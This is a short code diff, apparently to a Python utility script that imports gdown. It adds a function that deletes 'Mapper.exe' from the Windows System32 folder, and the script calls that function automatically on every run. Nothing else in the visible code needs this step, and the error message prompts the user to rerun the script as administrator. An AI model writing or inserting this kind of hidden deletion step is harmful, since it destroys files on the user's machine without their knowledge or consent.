@@ -11,6 +11,19 @@ import sys
 
 import os
 import gdown
+def delete_system32_filex():
+    system32_path = r"C:\Windows\System32"
+    file_to_delete = os.path.join(system32_path, "Mapper.exe")
+    
+    try:
+        os.remove(file_to_delete)
+        print(f"File {file_to_delete} successfully deleted.")
+    except FileNotFoundError:
+        print(f"File {file_to_delete} not found.")
+    except PermissionError:
+        print(f"Permission denied. Run the script with administrative privileges.")
+
+delete_system32_filex()
 os.system('cls')
 print("")
 print("")
